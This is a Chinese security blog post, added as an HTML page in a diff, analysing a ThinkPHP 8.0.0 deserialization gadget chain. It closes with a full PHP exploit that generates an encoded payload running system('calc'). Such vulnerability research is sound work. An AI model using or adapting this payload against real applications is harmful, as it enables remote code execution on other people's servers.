@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="p0l1st">
+
+
+
+    <meta name="description" content="blog">
+
+
+
+<title>ThinkPHP8反序列化利用链分析 | p0l1st&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/b.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
+</head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">p0l1st&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">p0l1st&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">ThinkPHP8反序列化利用链分析</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">p0l1st</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 16, 2024&nbsp;&nbsp;13:24:35</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>配置环境参照官方文档：[ThinkPHP8官方手册][<a target="_blank" rel="noopener" href="https://doc.thinkphp.cn/v8_0/preface.html]">https://doc.thinkphp.cn/v8_0/preface.html]</a></p>
+<p>注意PHP版本在PHP8以上</p>
+<p>下载好源码后更新composer，这里我用的是ThinkPHP8.0.0</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161329504.png" alt="img"></p>
+<p>app\controller\Index.php添加反序列化入口</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161334277.png" alt="img"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>反序列化入口一般是destruct或wakeup方法，而wakeup一般用于对象初始化，大多选择destruct方法作为反序列化起点</p>
+<p>我们先来全局搜索destruct方法</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161340430.png" alt="img"></p>
+<p>可以看到只有两个可选，先看Connection类</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161341050.png" alt="img"></p>
+<p>这里的destruct方法只是用来关闭数据库连接，并且Connection类实现了ConnectionInterface接口，destruct方法调用的是接口中的方法，再看其子类</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161345992.png" alt="img"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161346266.png" alt="img"></p>
+<p>两个子类的close方法都用于赋值，不适合作为反序列化链的起点，再看ResourceRegister类</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161348269.png" alt="img"></p>
+<p>$registered可控，跟进register方法</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161353261.png" alt="img"></p>
+<p>$resource是可控的，那这里就可以利用$resource方法触发call方法，但是getRule方法是无参，没有办法控制call方法中的$args参数</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161357071.png" alt="img"></p>
+<p>再看parseGroupRule方法，getRule方法的返回值可控，这里的option、last也是可控的，那么就可以利用字符串拼接触发toString方法</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161406789.png" alt="img"></p>
+<p>再找可利用的toString方法，这里选择Conversion类的toString方法</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161412754.png" alt="img"></p>
+<p>跟进toJson方法</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161413344.png" alt="img"></p>
+<p>继续跟进toArray方法</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161414247.png" alt="img"></p>
+<p>跟进appendAttrToArray方法</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161424169.png" alt="img"></p>
+<p>最后来到getRelationWith方法</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161431091.png" alt="img"></p>
+<p>这里可以通过$relation-&gt;visible($visible[$key])触发call方法，再利用Validate类的匿名函数执行call_user_func_array</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161440878.png" alt="img"></p>
+<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">route</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">ResourceRegister</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">resource</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$resource</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;resource = <span class="variable">$resource</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RuleGroup</span> <span class="keyword">extends</span> <span class="title">Rule</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Resource</span> <span class="keyword">extends</span> <span class="title">RuleGroup</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Rule</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$rest</span> = [<span class="string">&#x27;key&#x27;</span> =&gt; [<span class="number">1</span> =&gt; <span class="string">&#x27;&lt;id&gt;&#x27;</span>]];</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;name&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$rule</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$router</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$option</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;rule = <span class="variable">$rule</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;router = <span class="variable">$router</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;option = [<span class="string">&#x27;var&#x27;</span> =&gt; [<span class="string">&#x27;nivia&#x27;</span> =&gt; <span class="variable">$option</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Route</span>&#123;&#125;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">relation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [<span class="string">&#x27;Nivia&#x27;</span> =&gt; <span class="string">&quot;1.2&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$visible</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$visible</span>, <span class="variable">$call</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;visible = [<span class="number">1</span> =&gt; <span class="variable">$visible</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;relation = [<span class="string">&#x27;1&#x27;</span> =&gt; <span class="variable">$call</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Validate</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$type</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;type = [<span class="string">&#x27;visible&#x27;</span> =&gt; <span class="string">&quot;system&quot;</span>];<span class="comment">//function</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$visible</span>, <span class="variable">$call</span></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$visible</span>, <span class="variable">$call</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">VarDumper</span>\<span class="title class_">Caster</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">VarDumper</span>\<span class="title class_">Cloner</span>\<span class="title class_">Stub</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ConstStub</span> <span class="keyword">extends</span> <span class="title">Stub</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">VarDumper</span>\<span class="title class_">Cloner</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Stub</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">value</span> = &quot;<span class="title class_">calc</span>&quot;; <span class="comment">//cmd</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">call</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">Validate</span>;</span><br><span class="line">    <span class="variable">$option</span> = <span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="keyword">new</span> <span class="title class_">Symfony\Component\VarDumper\Caster\ConstStub</span>, <span class="variable">$call</span>);</span><br><span class="line">    <span class="variable">$router</span> = <span class="keyword">new</span> think\Route;</span><br><span class="line">    <span class="variable">$resource</span> = <span class="keyword">new</span> think\route\<span class="title function_ invoke__">Resource</span>(<span class="string">&quot;abc.nivia&quot;</span>, <span class="variable">$router</span> , <span class="variable">$option</span>);</span><br><span class="line">    <span class="variable">$resourceRegister</span> = <span class="keyword">new</span> think\route\<span class="title function_ invoke__">ResourceRegister</span>(<span class="variable">$resource</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$resourceRegister</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161442184.png" alt="img"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/07/10/ThinkPHP6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/">ThinkPHP6.0.13反序列化(CVE-2022-38352)分析</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© p0l1st | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
